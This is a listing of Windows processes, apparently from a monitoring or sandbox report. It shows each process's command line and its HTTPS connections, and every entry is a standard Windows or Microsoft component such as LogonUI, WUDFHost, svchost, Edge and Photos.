+LogonUI.exe (PID 12404): ""LogonUI.exe" /flags:0x0 /state0:0xa2bd6855 /state1:0x41c64e6d"
+smss.exe (PID 14144): "\SystemRoot\System32\smss.exe 000000ec 00000084 "
+  └─ csrss.exe (PID 4028): "%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
+  └─ winlogon.exe (PID 18380): "winlogon.exe"
+    └─ LogonUI.exe (PID 8748): ""LogonUI.exe" /flags:0x2 /state0:0xa2be2055 /state1:0x41c64e6d"
+    └─ fontdrvhost.exe (PID 6636): ""fontdrvhost.exe""
+    └─ dwm.exe (PID 13024): ""dwm.exe""
+WUDFHost.exe (PID 9020): ""C:\Windows\System32\WUDFHost.exe" -HostGUID:{193a1820-d9ac-4997-8c55-be817523f6aa} -IoEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-c0690dd3-da13-4ca1-beb7-51c9526bc672 -SystemEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-7be397e6-129c-4bed-a79b-adb9c32d4172 -IoCancelEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-f70e4449-220f-4554-8db5-ad3e611b6eb3 -NonStateChangingEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-c2005e82-0193-48c4-bb90-1aaacd9e77f9 -LifetimeId:57d4bfb1-0de"
+ChsIME.exe (PID 17996): "C:\Windows\System32\InputMethod\CHS\ChsIME.exe -Embedding"
+WUDFHost.exe (PID 9900): ""C:\Windows\System32\WUDFHost.exe" -HostGUID:{193a1820-d9ac-4997-8c55-be817523f6aa} -IoEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-335cff87-8f59-428c-80f5-c0b381fcc24b -SystemEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-1eaca7d2-382d-42c4-9240-d16eeeda5213 -IoCancelEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-e9f32e68-7147-4ee2-a645-d304ade2c922 -NonStateChangingEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-6e94bb5e-5782-482d-8b06-df92de4ab06e -LifetimeId:09c9a018-bbe"
+LogonUI.exe (PID 9808): ""LogonUI.exe" /flags:0x0 /state0:0xa2bee055 /state1:0x41c64e6d"
+WUDFHost.exe (PID 14904): ""C:\Windows\System32\WUDFHost.exe" -HostGUID:{193a1820-d9ac-4997-8c55-be817523f6aa} -IoEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-120767d4-6ac6-45f5-8389-9a232d5d30ff -SystemEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-e4656342-a29e-43d0-8ba8-3dcbec434781 -IoCancelEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-8f8e6cc9-f56b-422e-a983-b0f5ed444419 -NonStateChangingEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-8e5b49bb-efdd-4b8b-8bc3-241190ebfbeb -LifetimeId:884c5380-63a"
+LogonUI.exe (PID 7112): ""LogonUI.exe" /flags:0x0 /state0:0xa0e28855 /state1:0x41c64e6d"
+svchost.exe (PID 12304): "C:\WINDOWS\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s WdiSystemHost"  [x2]
+LogonUI.exe (PID 15832): ""LogonUI.exe" /flags:0x0 /state0:0xa0dd5855 /state1:0x41c64e6d"
+MicrosoftEdgeUpdate.exe (PID 19060): ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc"
+      connected to → 40.124.168.44:443
+  └─ MicrosoftEdgeUpdate.exe (PID 14344): ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /ping PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48cmVxdWVzdCBwcm90b2NvbD0iMy4wIiB1cGRhdGVyPSJPbWFoYSIgdXBkYXRlcnZlcnNpb249IjEuMy4xNTcuNjEiIHNoZWxsX3ZlcnNpb249IjEuMy4xNDcuMzciIGlzbWFjaGluZT0iMSIgc2Vzc2lvbmlkPSJ7QjlFNDUzNzUtQjNFMC00Qjk3LTg1MEMtM0M2MzIyRjA5MjNGfSIgdXNlcmlkPSJ7QTFGNjlBQzMtNDc5MS00N0M5LUJGNTQtOTBBQTVCNzNEN0Y0fSIgaW5zdGFsbHNvdXJjZT0ic2NoZWR1bGVyIiByZXF1ZXN0aWQ9Ins0QzczRjFGMS0xNTYwLTQ0MTAtOTg0MS1GRkU1MDk0Mzk3RjB9IiBkZWR1"
+        connected to → 13.107.43.16:443
+WUDFHost.exe (PID 19124): ""C:\Windows\System32\WUDFHost.exe" -HostGUID:{193a1820-d9ac-4997-8c55-be817523f6aa} -IoEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-36a0a16b-81a7-4c57-84f7-dea70ac05653 -SystemEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-c73e780b-4d5e-4e22-ab21-2ac4b6df5ba1 -IoCancelEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-07c180e8-f16b-4acd-b740-ddf5b696f182 -NonStateChangingEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-170192d3-598e-4b5d-a06c-7ab73d3e49e0 -LifetimeId:780382a5-7aa"
+LogonUI.exe (PID 10524): ""LogonUI.exe" /flags:0x0 /state0:0xa0d6d055 /state1:0x41c64e6d"
+backgroundTaskHost.exe (PID 7960): ""C:\WINDOWS\system32\backgroundTaskHost.exe" -ServerName:App.AppXggkaqzf6p31g37n0m8phzeswb0rt9m7e.mca" PackageFullName="Microsoft.Wallet_2.4.18324.0_x64__8wekyb3d8bbwe" ApplicationID="App"
+backgroundTaskHost.exe (PID 10548): ""C:\WINDOWS\system32\backgroundTaskHost.exe" -ServerName:App.AppXxw3e32mpkfkfbh0tznpwwqfw96t0tfx6.mca" PackageFullName="NcsiUwpApp_1000.19041.1023.0_neutral_neutral_8wekyb3d8bbwe" ApplicationID="App"
+LogonUI.exe (PID 11052): ""LogonUI.exe" /flags:0x0 /state0:0xa0cde855 /state1:0x41c64e6d"
+WUDFHost.exe (PID 18360): ""C:\Windows\System32\WUDFHost.exe" -HostGUID:{193a1820-d9ac-4997-8c55-be817523f6aa} -IoEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-d800bc55-9888-444c-ac40-4265870384ea -SystemEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-0dd1a7b1-a090-4b90-a0fc-0673129d4f3a -IoCancelEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-fffc1bdf-eba4-4d46-b911-b09883586350 -NonStateChangingEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-31754499-aeb8-4d17-879e-f8de3ac3e86a -LifetimeId:9a221e31-526"
+LogonUI.exe (PID 18388): ""LogonUI.exe" /flags:0x0 /state0:0xa0cea855 /state1:0x41c64e6d"
+msedge.exe (PID 5616): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --profile-directory=Default"  [x2]
+      connected to → 40.90.184.73:443
+      connected to → 20.212.96.199:443
+SearchProtocolHost.exe (PID 6292): ""C:\WINDOWS\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe64_ Global\UsGthrCtrlFltPipeMssGthrPipe64 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" "
+svchost.exe (PID 11428): "C:\WINDOWS\system32\svchost.exe -k LocalService -p -s SstpSvc"
+svchost.exe (PID 3772): "C:\WINDOWS\System32\svchost.exe -k netsvcs -p -s NetSetupSvc"
+svchost.exe (PID 11560): "C:\WINDOWS\System32\svchost.exe -k netsvcs"
+Microsoft.Photos.exe (PID 18844): ""C:\Program Files\WindowsApps\Microsoft.Windows.Photos_2021.21090.10008.0_x64__8wekyb3d8bbwe\Microsoft.Photos.exe" -ServerName:App.AppXzst44mncqdg84v7sv6p7yznqwssy6f7f.mca" PackageFullName="Microsoft.Windows.Photos_2021.21090.10008.0_x64__8wekyb3d8bbwe" ApplicationID="App"  [x2]
+      connected to → 13.105.74.49:443
+      connected to → 40.90.130.197:443
+      connected to → 20.190.144.161:443
+      connected to → 131.253.14.229:443
+      connected to → 13.105.28.3:443
+      connected to → 40.90.136.1:443
+      connected to → 40.126.16.167:443
+RuntimeBroker.exe (PID 5280): "C:\Windows\System32\RuntimeBroker.exe -Embedding" PackageFullName="Microsoft.Windows.Photos_2021.21090.10008.0_x64__8wekyb3d8bbwe" ApplicationID="runtimebroker07f4358a809ac99a64a67c1"  [x2]
+taskhostw.exe (PID 17840): "taskhostw.exe SYSTEM"
+taskhostw.exe (PID 10220): "taskhostw.exe USER"
